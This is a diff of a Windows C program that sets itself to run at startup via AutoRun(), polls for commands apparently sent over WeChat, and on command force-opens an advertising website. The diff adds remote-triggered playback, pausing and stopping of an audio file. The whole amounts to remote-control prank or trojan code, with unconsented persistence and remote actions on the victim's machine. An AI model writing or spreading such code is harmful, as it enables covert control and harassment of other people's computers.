@@ -2,13 +2,16 @@
 #include "itmojun.h"
 #include <windows.h>
 
-// 引入当前工程下的itmojun.lib库文件
-#pragma comment(lib, "itmojun.lib")
+// 引入当前工程下的itmojun.lib以及winmm库文件
+#pragma comment(lib, "itmojun.lib") //AutoRun() 以及 GetPCCmd()
+#pragma comment(lib, "winmm.lib") //mciSendString()
 
 int main()
 {
 	char cmd[301]; //存放从微信接受的消息
 	AutoRun(); //将当前程序设置为开机自动运行
+
+	mciSendString("open bg.mp3 alias s", NULL, 0, NULL); //打开指定音乐文件并指定其别名为s
 
 	while(1)
 	{
@@ -55,6 +58,18 @@ int main()
 		{
 			//强制打开广告
 			WinExec("explorer http://www.4399.com", 1);
+		}
+		else if(strstr(cmd, "播放"))
+		{
+			mciSendString("play s repeat", NULL, 0, NULL); //重复播放s
+		}
+		else if(strstr(cmd, "暂停"))
+		{
+			mciSendString("pause s", NULL, 0, NULL);
+		}
+		else if(strstr(cmd, "停止"))
+		{
+			mciSendString("close s", NULL, 0, NULL);
 		}
 		
 
